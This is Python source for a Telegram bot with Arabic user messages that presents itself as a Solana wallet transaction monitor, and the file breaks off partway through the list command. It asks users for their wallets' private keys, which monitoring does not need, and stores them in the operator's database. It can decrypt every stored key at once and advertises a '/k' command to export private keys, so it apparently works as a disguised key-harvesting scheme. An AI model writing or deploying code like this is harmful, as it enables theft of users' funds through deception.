"""
Solana Wallet Monitor Bot - Complete Implementation
Monitors Solana wallet transactions and sends Telegram notifications
"""

import os
import logging
import asyncio
import json
import base58
from datetime import datetime
from typing import Dict, List
from cryptography.fernet import Fernet
import asyncpg
from urllib.parse import urlparse

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from solders.keypair import Keypair
from solders.pubkey import Pubkey

# Setup logging first
def setup_logging():
    """Setup logging configuration"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('solana_bot.log'),
            logging.StreamHandler()
        ]
    )
    
    # Set external loggers to WARNING level to reduce noise
    logging.getLogger('httpx').setLevel(logging.WARNING)
    logging.getLogger('telegram').setLevel(logging.WARNING)
    logging.getLogger('telegram.ext').setLevel(logging.WARNING)
    logging.getLogger('aiohttp').setLevel(logging.WARNING)
    logging.getLogger('asyncio').setLevel(logging.WARNING)
    
    # Set our main logger to INFO level for better debugging
    main_logger = logging.getLogger(__name__)
    main_logger.setLevel(logging.INFO)

logger = logging.getLogger(__name__)
setup_logging()

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
SOLANA_RPC_URL = os.getenv("RPC_URL")
POLLING_INTERVAL = 15  # seconds
MAX_MONITORED_WALLETS = 100000

# Dust transaction filter - skip notifications for amounts smaller than this
MIN_NOTIFICATION_AMOUNT = 0.001  # SOL - can be adjusted as needed

# Channel and Admin Configuration
MONITORING_CHANNEL = os.getenv("ID_CHAT")  # القناة التي ستستقبل إشعارات المراقبة (ID فقط)
ADMIN_CHAT_ID = 5053683608  # معرف المشرف الذي سيحصل على الإشعارات أيضاً

# Arabic Messages
MESSAGES = {
    "welcome": "🔮 مرحباً بك في بوت مراقبة محافظ سولانا!\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية عند حدوث معاملة جديدة.\n\nاستخدم /help لمعرفة الأوامر المتاحة.",
    "enter_private_key": "🔑 الرجاء إدخال المفتاح الخاص للمحفظة التي تريد مراقبتها:\n\n⚠️ تأكد من أن المفتاح صحيح ولا تشاركه مع أي شخص آخر!",
    "invalid_private_key": "❌ المفتاح الخاص غير صحيح. الرجاء التأكد من صحة المفتاح وإعادة المحاولة.",
    "monitoring_started": "✅ تم بدء مراقبة المحفظة: {wallet_address}\n\n🔔 سيتم إرسال إشعارات المعاملات إلى قناة المراقبة @moraqaba12",
    "monitoring_stopped": "🛑 تم إيقاف مراقبة المحفظة: {wallet_address}",
    "wallet_not_found": "❌ لم يتم العثور على المحفظة في قائمة المراقبة.",
    "no_wallets_monitored": "📭 لا توجد محافظ مراقبة حالياً.\n\nاستخدم /monitor لبدء مراقبة محفظة جديدة.",
    "max_wallets_reached": "⚠️ لقد وصلت إلى الحد الأقصى من المحافظ المراقبة ({max_wallets} محافظ).\n\nالرجاء إيقاف مراقبة محفظة أولاً باستخدام /stop.",
    "transaction_notification": "💰 معاملة جديدة!\n\n🏦 المحفظة: {wallet_address}\n💵 المبلغ: {amount} SOL",
    "error_occurred": "❌ حدث خطأ: {error}",
    "monitoring_status": "📊 حالة المراقبة:\n\n{status}",
    "wallet_already_monitored": "⚠️ هذه المحفظة مراقبة بالفعل.",
    "select_wallet_to_stop": "اختر المحفظة التي تريد إيقاف مراقبتها:",
    "help_text": "🤖 بوت مراقبة محافظ سولانا\n\nهذا البوت يساعدك في مراقبة معاملات محافظ سولانا والحصول على إشعارات فورية.\n\n🔧 يعمل حالياً على شبكة Devnet للتجربة\n\n📋 الأوامر:\n/start - بدء البوت\n/monitor - بدء مراقبة محفظة جديدة\n/add - إضافة عدة محافظ دفعة واحدة\n/stop - إيقاف مراقبة محفظة\n/list - عرض المحافظ المراقبة\n/k - تصدير المفاتيح الخاصة\n/help - عرض هذه المساعدة\n\n🚀 لإنشاء محفظة تجريبية:\n1. اذهب إلى https://solana.fm/address\n2. انقر على 'Generate Keypair'\n3. احفظ المفتاح الخاص والعنوان\n4. احصل على SOL تجريبي من https://faucet.solana.com\n\n⚠️ تنبيه أمني:\nلا تشارك مفاتيحك الخاصة مع أي شخص آخر!"
}




# Database Manager
class DatabaseManager:
    def __init__(self):
        self.database_url = DATABASE_URL
        self.encryption_key = self._get_encryption_key()
        self.fernet = Fernet(self.encryption_key)
        self.pool = None

    def _get_encryption_key(self) -> bytes:
        """Get or generate encryption key for private keys"""
        if 'ENCRYPTION_KEY' in os.environ:
            return os.environ['ENCRYPTION_KEY'].encode()
        
        key_file = "encryption.key"
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                key_content = f.read()
                # Store the key in environment variable for future use
                os.environ['ENCRYPTION_KEY'] = key_content.decode()
                return key_content
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            # Store the key in environment variable
            os.environ['ENCRYPTION_KEY'] = key.decode()
            logger.warning("Generated new encryption key. In production, store this securely!")
            return key

    async def initialize(self):
        """Initialize database connection pool and create tables"""
        try:
            # Create connection pool
            self.pool = await asyncpg.create_pool(
                self.database_url,
                min_size=1,
                max_size=10,
                command_timeout=60
            )
            await self.create_tables()
            logger.info("PostgreSQL database initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize database: {e}")
            raise

    async def close(self):
        """Close database connection pool"""
        if self.pool:
            await self.pool.close()

    async def create_tables(self):
        """Create database tables"""
        async with self.pool.acquire() as conn:
            # Users table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    chat_id BIGINT UNIQUE NOT NULL,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Monitored wallets table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS monitored_wallets (
                    id SERIAL PRIMARY KEY,
                    chat_id BIGINT NOT NULL,
                    wallet_address TEXT NOT NULL,
                    private_key_encrypted TEXT NOT NULL,
                    nickname TEXT,
                    is_active BOOLEAN DEFAULT TRUE,
                    last_signature TEXT,
                    monitoring_start_time BIGINT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Transaction history table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS transaction_history (
                    id SERIAL PRIMARY KEY,
                    wallet_address TEXT NOT NULL,
                    chat_id BIGINT NOT NULL,
                    signature TEXT UNIQUE NOT NULL,
                    amount TEXT NOT NULL,
                    tx_type TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    block_time BIGINT,
                    status TEXT DEFAULT 'confirmed',
                    notified BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Settings table for persistent configuration
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS settings (
                    id SERIAL PRIMARY KEY,
                    setting_key TEXT UNIQUE NOT NULL,
                    setting_value TEXT NOT NULL,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

    def _encrypt_private_key(self, private_key: str) -> str:
        """Encrypt private key for storage"""
        return self.fernet.encrypt(private_key.encode()).decode()

    def _decrypt_private_key(self, encrypted_key: str) -> str:
        """Decrypt private key from storage"""
        return self.fernet.decrypt(encrypted_key.encode()).decode()

    async def add_user(self, chat_id: int, username: str = None, first_name: str = None, last_name: str = None) -> bool:
        """Add or update user in database"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO users (chat_id, username, first_name, last_name, updated_at)
                    VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP)
                    ON CONFLICT (chat_id) 
                    DO UPDATE SET 
                        username = EXCLUDED.username,
                        first_name = EXCLUDED.first_name,
                        last_name = EXCLUDED.last_name,
                        updated_at = CURRENT_TIMESTAMP
                """, chat_id, username, first_name, last_name)
                return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False

    async def add_monitored_wallet(self, chat_id: int, wallet_address: str, private_key: str, nickname: str = None) -> bool:
        """Add a wallet to monitoring"""
        try:
            encrypted_key = self._encrypt_private_key(private_key)
            monitoring_start_time = int(datetime.now().timestamp())
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO monitored_wallets (chat_id, wallet_address, private_key_encrypted, nickname, monitoring_start_time)
                    VALUES ($1, $2, $3, $4, $5)
                """, chat_id, wallet_address, encrypted_key, nickname, monitoring_start_time)
                logger.info(f"Wallet {wallet_address} added for monitoring for user {chat_id} at {monitoring_start_time}")
                return True
        except Exception as e:
            logger.error(f"Error adding monitored wallet: {e}")
            return False

    async def remove_monitored_wallet(self, chat_id: int, wallet_address: str) -> bool:
        """Remove a wallet from monitoring"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.execute("""
                    UPDATE monitored_wallets 
                    SET is_active = FALSE, updated_at = CURRENT_TIMESTAMP
                    WHERE chat_id = $1 AND wallet_address = $2 AND is_active = TRUE
                """, chat_id, wallet_address)
                return "UPDATE 1" in result
        except Exception as e:
            logger.error(f"Error removing monitored wallet: {e}")
            return False

    async def get_monitored_wallets(self, chat_id: int) -> List[dict]:
        """Get all monitored wallets for a user"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
                    FROM monitored_wallets 
                    WHERE chat_id = $1 AND is_active = TRUE
                """, chat_id)
                
                return [
                    {
                        'wallet_address': row['wallet_address'],
                        'nickname': row['nickname'],
                        'last_signature': row['last_signature'],
                        'monitoring_start_time': row['monitoring_start_time'],
                        'created_at': row['created_at'],
                        'updated_at': row['updated_at']
                    }
                    for row in rows
                ]
        except Exception as e:
            logger.error(f"Error getting monitored wallets for user {chat_id}: {e}")
            return []

    async def get_all_monitored_wallets(self) -> List[dict]:
        """Get all active monitored wallets"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT wallet_address, private_key_encrypted, chat_id, nickname, last_signature, monitoring_start_time
                    FROM monitored_wallets WHERE is_active = TRUE
                """)
                
                wallets = []
                for row in rows:
                    try:
                        decrypted_key = self._decrypt_private_key(row['private_key_encrypted'])
                        wallets.append({
                            'wallet_address': row['wallet_address'],
                            'private_key': decrypted_key,
                            'chat_id': row['chat_id'],
                            'nickname': row['nickname'],
                            'last_signature': row['last_signature'],
                            'monitoring_start_time': row['monitoring_start_time']
                        })
                    except Exception as decrypt_error:
                        logger.error(f"Error decrypting key for wallet {row['wallet_address']}: {decrypt_error}")
                        continue
                
                return wallets
                
        except Exception as e:
            logger.error(f"Error getting all monitored wallets: {e}")
            return []

    async def get_monitored_wallets_by_address(self, wallet_address: str) -> List[dict]:
        """Get monitored wallet by address"""
        try:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch("""
                    SELECT chat_id, wallet_address, nickname, last_signature, monitoring_start_time, created_at, updated_at
                    FROM monitored_wallets 
                    WHERE wallet_address = $1 AND is_active = TRUE
                """, wallet_address)
                
                wallets = []
                for row in rows:
                    wallets.append({
                        'chat_id': row['chat_id'],
                        'wallet_address': row['wallet_address'],
                        'nickname': row['nickname'],
                        'last_signature': row['last_signature'],
                        'monitoring_start_time': row['monitoring_start_time'],
                        'created_at': row['created_at'],
                        'updated_at': row['updated_at']
                    })
                
                return wallets
        except Exception as e:
            logger.error(f"Error getting monitored wallets by address {wallet_address}: {e}")
            return []

    async def get_users_count(self) -> int:
        """Get total number of registered users"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.fetchval("SELECT COUNT(*) FROM users WHERE is_active = TRUE")
                return result if result else 0
        except Exception as e:
            logger.error(f"Error getting users count: {e}")
            return 0

    async def update_last_signature(self, wallet_address: str, signature: str) -> bool:
        """Update the last processed signature for a wallet"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    UPDATE monitored_wallets 
                    SET last_signature = $1, updated_at = CURRENT_TIMESTAMP
                    WHERE wallet_address = $2 AND is_active = TRUE
                """, signature, wallet_address)
                return True
        except Exception as e:
            logger.error(f"Error updating last signature: {e}")
            return False

    async def add_transaction_record(self, wallet_address: str, chat_id: int, signature: str, 
                                   amount: str, tx_type: str, block_time: int) -> bool:
        """Add a transaction record"""
        try:
            timestamp = datetime.fromtimestamp(block_time) if block_time else datetime.now()
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO transaction_history 
                    (wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time, notified)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, TRUE)
                    ON CONFLICT (signature) DO NOTHING
                """, wallet_address, chat_id, signature, amount, tx_type, timestamp, block_time)
                return True
        except Exception as e:
            logger.error(f"Error adding transaction record: {e}")
            return False

    async def save_setting(self, key: str, value: str) -> bool:
        """Save a setting to database"""
        try:
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    INSERT INTO settings (setting_key, setting_value, updated_at)
                    VALUES ($1, $2, CURRENT_TIMESTAMP)
                    ON CONFLICT (setting_key)
                    DO UPDATE SET 
                        setting_value = EXCLUDED.setting_value,
                        updated_at = CURRENT_TIMESTAMP
                """, key, value)
                return True
        except Exception as e:
            logger.error(f"Error saving setting {key}: {e}")
            return False

    async def get_setting(self, key: str, default_value: str = None) -> str:
        """Get a setting from database"""
        try:
            async with self.pool.acquire() as conn:
                result = await conn.fetchval("""
                    SELECT setting_value FROM settings WHERE setting_key = $1
                """, key)
                return result if result else default_value
        except Exception as e:
            logger.error(f"Error getting setting {key}: {e}")
            return default_value


# Utility Functions
def validate_private_key(private_key_str: str) -> tuple[bool, str]:
    """Validate a Solana private key string"""
    try:
        # Handle both base58 and array formats
        if private_key_str.startswith('[') and private_key_str.endswith(']'):
            # Array format like [1,2,3,...]
            key_array = json.loads(private_key_str)
            if len(key_array) != 64:
                return False, "Private key array must have exactly 64 bytes"
            private_key_bytes = bytes(key_array)
        else:
            # Base58 format
            try:
                private_key_bytes = base58.b58decode(private_key_str)
                if len(private_key_bytes) != 64:
                    return False, "Private key must be 64 bytes"
            except Exception:
                return False, "Invalid base58 encoding"
        
        # Create keypair to validate
        keypair = Keypair.from_bytes(private_key_bytes)
        wallet_address = str(keypair.pubkey())
        
        return True, wallet_address
        
    except Exception as e:
        return False, f"Invalid private key: {str(e)}"

def format_sol_amount(lamports: int) -> str:
    """Convert lamports to SOL"""
    sol = lamports / 1_000_000_000  # 1 SOL = 1 billion lamports
    return f"{sol:.9f}"

def get_transaction_type(transaction_data: dict) -> str:
    """Determine transaction type from transaction data"""
    # Simple heuristic based on transaction structure
    instructions = transaction_data.get('transaction', {}).get('message', {}).get('instructions', [])
    
    if not instructions:
        return "معاملة عامة"
    
    # Check for system program (transfers)
    for instruction in instructions:
        program_id = instruction.get('programId', '')
        if program_id == '11111111111111111111111111111112':  # System Program
            return "تحويل SOL"
    
    return "معاملة عامة"

def truncate_address(address: str, length: int = 8) -> str:
    """Truncate wallet address for display"""
    if len(address) <= length * 2:
        return address
    return f"{address[:length]}...{address[-length:]}"

def escape_markdown_v2(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    # Characters that need to be escaped in MarkdownV2
    chars_to_escape = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    
    for char in chars_to_escape:
        text = text.replace(char, f'\\{char}')
    
    return text

def format_timestamp(timestamp: int) -> str:
    """Format Unix timestamp to readable string"""
    if not timestamp:
        return "غير محدد"
    
    dt = datetime.fromtimestamp(timestamp)
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# Solana Monitor
class SolanaMonitor:
    def __init__(self):
        self.session = None
        self.monitoring_tasks: Dict[str, any] = {}
        self.db_manager = DatabaseManager()

    async def start_session(self):
        """Initialize aiohttp session"""
        if not self.session:
            self.session = aiohttp.ClientSession()

    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None

    async def add_wallet(self, private_key_str: str, chat_id: int, callback_func) -> tuple[bool, str]:
        """Add a wallet to monitoring"""
        try:
            # Validate private key
            is_valid, result = validate_private_key(private_key_str)
            if not is_valid:
                return False, result
            
            wallet_address = result
            
            # Check if already monitoring
            existing_wallets = await self.db_manager.get_monitored_wallets(chat_id)
            for wallet in existing_wallets:
                if wallet['wallet_address'] == wallet_address:
                    return False, "wallet_already_monitored"
            
            # Add to database
            success = await self.db_manager.add_monitored_wallet(chat_id, wallet_address, private_key_str)
            if not success:
                return False, "Database error"
            
            # Start monitoring
            await self.start_monitoring_wallet(wallet_address, chat_id, callback_func)
            
            logger.info(f"Started monitoring wallet: {wallet_address} for chat: {chat_id}")
            return True, wallet_address
            
        except Exception as e:
            logger.error(f"Error adding wallet: {e}")
            return False, str(e)

    async def remove_wallet(self, wallet_address: str, chat_id: int) -> bool:
        """Remove a wallet from monitoring"""
        try:
            # Remove from database
            success = await self.db_manager.remove_monitored_wallet(chat_id, wallet_address)
            if not success:
                return False
            
            # Stop monitoring task
            task_key = f"{wallet_address}_{chat_id}"
            if task_key in self.monitoring_tasks:
                if isinstance(self.monitoring_tasks[task_key], dict):
                    self.monitoring_tasks[task_key]['task'].cancel()
                else:
                    self.monitoring_tasks[task_key].cancel()
                del self.monitoring_tasks[task_key]
            
            logger.info(f"Stopped monitoring wallet: {wallet_address} for chat: {chat_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error removing wallet: {e}")
            return False

    async def start_monitoring_wallet(self, wallet_address: str, chat_id: int = None, callback_func=None):
        """Start monitoring task for a specific wallet"""
        async def monitor_task():
            while True:
                try:
                    # Check if wallet is still being monitored in database
                    wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
                    if not wallets:
                        break
                    
                    await self.check_transactions(wallet_address)
                    await asyncio.sleep(POLLING_INTERVAL)
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.error(f"Error in monitoring task for {wallet_address}: {e}")
                    await asyncio.sleep(POLLING_INTERVAL)
        
        # Create task key to include callback info
        task_key = f"{wallet_address}_{chat_id}" if chat_id else wallet_address
        
        # Cancel existing task if any
        if task_key in self.monitoring_tasks:
            if isinstance(self.monitoring_tasks[task_key], dict):
                self.monitoring_tasks[task_key]['task'].cancel()
            else:
                self.monitoring_tasks[task_key].cancel()
        
        # Start new task with callback info
        task = asyncio.create_task(monitor_task())
        self.monitoring_tasks[task_key] = {
            'task': task,
            'callback': callback_func,
            'chat_id': chat_id,
            'wallet_address': wallet_address
        }

    async def check_transactions(self, wallet_address: str):
        """Check for new transactions on a wallet"""
        try:
            if not self.session:
                await self.start_session()

            # Get recent transactions
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignaturesForAddress",
                "params": [
                    wallet_address,
                    {"limit": 10}
                ]
            }
            
            async with self.session.post(SOLANA_RPC_URL, json=payload) as response:
                data = await response.json()
                
                if 'result' not in data or not data['result']:
                    return
                
                signatures = data['result']
                
                # Get wallet info from database
                wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
                if not wallets:
                    return
                
                last_signature = wallets[0].get('last_signature')
                monitoring_start_time = wallets[0].get('monitoring_start_time')
                
                # Check if this is the first check - mark all current transactions as already processed
                if not last_signature:
                    if signatures:
                        # On first check, save the most recent signature without processing any transactions
                        await self.db_manager.update_last_signature(wallet_address, signatures[0]['signature'])
                    return
                
                # Find new transactions
                new_transactions = []
                
                for sig_info in signatures:
                    if sig_info['signature'] == last_signature:
                        break
                    
                    # Filter by monitoring start time if available
                    tx_time = sig_info.get('blockTime')
                    if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
                        logger.info(f"Skipping transaction {sig_info['signature'][:8]}... - occurred before monitoring started")
                        continue
                    
                    new_transactions.append(sig_info)
                
                # Process new transactions - ONLY ONCE PER TRANSACTION
                if new_transactions:
                    await self.db_manager.update_last_signature(wallet_address, new_transactions[0]['signature'])
                    
                    for tx_info in reversed(new_transactions):  # Process in chronological order
                        # Double-check transaction time before processing
                        tx_time = tx_info.get('blockTime')
                        if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
                            continue
                        
                        # Process each transaction only once, regardless of how many users monitor the wallet
                        await self.process_single_transaction(wallet_address, tx_info)
                        
        except Exception as e:
            logger.error(f"Error checking transactions for {wallet_address}: {e}")

    async def process_single_transaction(self, wallet_address: str, tx_info: dict):
        """Process a new transaction and send notification"""
        try:
            # Get wallet info from database
            wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
            if not wallets:
                return
            
            # Get detailed transaction data
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTransaction",
                "params": [
                    tx_info['signature'],
                    {"encoding": "json", "maxSupportedTransactionVersion": 0}
                ]
            }
            
            async with self.session.post(SOLANA_RPC_URL, json=payload) as response:
                data = await response.json()
                
                if 'result' not in data or not data['result']:
                    return
                
                transaction = data['result']
                
                # Extract transaction details
                amount, tx_type = self.calculate_balance_change(transaction, wallet_address)
                timestamp = format_timestamp(transaction.get('blockTime', 0))
                signature = tx_info['signature']
                block_time = transaction.get('blockTime', 0)
                
                # Check if this is a dust transaction (very small amount)
                try:
                    amount_float = abs(float(amount))  # Get absolute value
                    # Skip notifications for dust transactions (less than MIN_NOTIFICATION_AMOUNT SOL)
                    if amount_float < MIN_NOTIFICATION_AMOUNT:
                        logger.info(f"Skipping dust transaction notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
                        # Still store in database but don't send notification
                        for wallet_info in wallets:
                            await self.db_manager.add_transaction_record(
                                wallet_address,
                                wallet_info['chat_id'],
                                signature,
                                amount,
                                "🌫️ معاملة غبار (تم تجاهلها)",
                                block_time or 0
                            )
                        return
                except (ValueError, TypeError):
                    # If amount conversion fails, proceed with notification
                    pass
                
                # Store transaction in database for all monitoring users
                for wallet_info in wallets:
                    await self.db_manager.add_transaction_record(
                        wallet_address,
                        wallet_info['chat_id'],
                        signature,
                        amount,
                        tx_type,
                        block_time or 0
                    )
                
                # Send SINGLE notification to channel - not per user
                # Look for any active monitoring task with callback
                for task_key, task_info in self.monitoring_tasks.items():
                    if (isinstance(task_info, dict) and 
                        'callback' in task_info and 
                        task_info['callback'] and
                        wallet_address in task_key):
                        # Send notification only once, not per user
                        await task_info['callback'](
                            wallets[0]['chat_id'],  # Use first user's chat_id as reference
                            wallet_address,
                            amount,
                            tx_type,
                            timestamp,
                            signature
                        )
                        break
                
        except Exception as e:
            logger.error(f"Error processing transaction: {e}")

    async def get_wallet_balance(self, wallet_address: str) -> float:
        """Get SOL balance for a wallet address"""
        try:
            if not self.session:
                await self.start_session()

            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [wallet_address]
            }
            
            async with self.session.post(SOLANA_RPC_URL, json=payload) as response:
                data = await response.json()
                
                if 'result' in data and 'value' in data['result']:
                    lamports = data['result']['value']
                    sol_balance = lamports / 1_000_000_000  # Convert to SOL
                    return sol_balance
                
                return 0.0
                
        except Exception as e:
            logger.error(f"Error getting balance for {wallet_address}: {e}")
            return 0.0

    def calculate_balance_change(self, transaction: dict, wallet_address: str) -> tuple[str, str]:
        """Calculate balance change and transaction type for the monitored wallet"""
        try:
            meta = transaction.get('meta', {})
            account_keys = transaction.get('transaction', {}).get('message', {}).get('accountKeys', [])
            
            # Find wallet index in account keys
            wallet_index = None
            for i, key in enumerate(account_keys):
                if key == wallet_address:
                    wallet_index = i
                    break
            
            if wallet_index is None:
                return "0", "معاملة عامة"
            
            # Get balance changes
            pre_balances = meta.get('preBalances', [])
            post_balances = meta.get('postBalances', [])
            
            if len(pre_balances) > wallet_index and len(post_balances) > wallet_index:
                pre_balance = pre_balances[wallet_index]
                post_balance = post_balances[wallet_index]
                change = post_balance - pre_balance
                amount = format_sol_amount(change)
                
                # Check for trading/DEX programs FIRST before checking balance direction
                instructions = transaction.get('transaction', {}).get('message', {}).get('instructions', [])
                for instruction in instructions:
                    program_id = instruction.get('programId', '')
                    # Extended list of known DEX and trading programs
                    trading_programs = [
                        '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8',  # Raydium V4
                        '9W959DqEETiGZocYWCQPaJ6sBmUzgfxXfqGeTEdp3aQP',  # Orca
                        'JUP4Fb2cqiRUcaTHdrPC8h2gNsA2ETXiPDD33WcGuJB',   # Jupiter V4
                        'JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4',   # Jupiter V6
                        'whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc',   # Whirlpool (Orca)
                        'CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK',   # Raydium CLMM
                        'PhoeNiXZ8ByJGLkxNfZRnkUfjvmuYqLR89jjFHGqdXY',   # Phoenix
                        'MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD',   # Mango Markets
                        '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1',   # GooseFX
                        'DjVE6JNiYqPL2QXyCUUh8rNjHrbz9hXHNYt99MQ59qw1',   # Orca V1
                        'SSwpkEEcbUqx4vtoEByFjSkhKdCT862DNVb52nZg1UZ',    # Saber
                        'AMM55ShdkoGRB5jVYPjWzTURSGdQnQ8LbtE4jktMTG8P',   # Aldrin AMM
                        'EhYXEhg6JT5p2ZnhbRSFzKHigPuKFZuL9EGo7ZtDC5VY',   # Serum DEX
                        'srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX',    # Serum DEX V3
                        '22Y43yTVxuUkoRKdm9thyRhQ3SdgQS7c7kB6UNCiaczD',   # Meteora
                        'LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo',    # Lifinity
                        'EewxydAPCCVuNEyrVN68PuSYdQ7wKn27V9Gjeoi8dy3S',   # Lifinity V2
                        'RaydiumCLMM',  # Placeholder for any Raydium CLMM variations
                    ]
                    
                    if program_id in trading_programs:
                        return amount, "🔄 تداول"
                
                # Check for token program interactions (might be token swaps)
                for instruction in instructions:
                    program_id = instruction.get('programId', '')
                    if program_id == 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA':  # SPL Token Program
                        # Check if there are multiple token transfers (swap indicator)
                        token_transfers = meta.get('preTokenBalances', []) or meta.get('postTokenBalances', [])
                        if len(token_transfers) > 1:
                            return amount, "🔄 تداول"
                
                # If no trading programs detected, determine by balance change
                if change > 0:
                    tx_type = "📥 استلام"
                elif change < 0:
                    tx_type = "📤 إرسال"
                else:
                    tx_type = "📋 معاملة عامة"
                
                return amount, tx_type
            
            return "0", "معاملة عامة"
            
        except Exception as e:
            logger.error(f"Error calculating balance change: {e}")
            return "0", "معاملة عامة"

    async def get_monitored_wallets_for_chat(self, chat_id: int) -> List[str]:
        """Get list of wallet addresses monitored for a specific chat"""
        wallets = await self.db_manager.get_monitored_wallets(chat_id)
        return [wallet['wallet_address'] for wallet in wallets]

    async def stop_all_monitoring(self):
        """Stop all monitoring tasks"""
        for task in self.monitoring_tasks.values():
            if isinstance(task, dict):
                task['task'].cancel()
            else:
                task.cancel()
        self.monitoring_tasks.clear()
        await self.close_session()


# Telegram Bot
class SolanaWalletBot:
    def __init__(self):
        self.monitor = SolanaMonitor()
        self.user_states: Dict[int, str] = {}  # chat_id -> state
        self.application = None

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        chat_id = update.effective_chat.id
        user = update.effective_user
        
        # Add user to database
        await self.monitor.db_manager.add_user(
            chat_id, user.username, user.first_name, user.last_name
        )
        
        await update.message.reply_text(MESSAGES["welcome"])

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        await update.message.reply_text(MESSAGES["help_text"])

    async def monitor_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /monitor command"""
        chat_id = update.effective_chat.id
        
        # Check if user has reached maximum wallets
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
            await update.message.reply_text(
                MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
            )
            return
        
        # Set user state to waiting for private key
        self.user_states[chat_id] = "waiting_private_key"
        await update.message.reply_text(MESSAGES["enter_private_key"])

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stop command"""
        chat_id = update.effective_chat.id
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        
        if not monitored_wallets:
            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
            return
        
        # Create inline keyboard with wallet options
        keyboard = []
        for wallet in monitored_wallets:
            keyboard.append([
                InlineKeyboardButton(
                    f"🔴 {truncate_address(wallet['wallet_address'])}",
                    callback_data=f"stop_{wallet['wallet_address']}"
                )
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            MESSAGES["select_wallet_to_stop"],
            reply_markup=reply_markup
        )

    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /list command"""
        chat_id = update.effective_chat.id
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        
        if not monitored_wallets:
            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
            return
        
        status_text = "📊 المحافظ المراقبة:\n\n"
        
        for i, wallet in enumerate(monitored_wallets, 1):
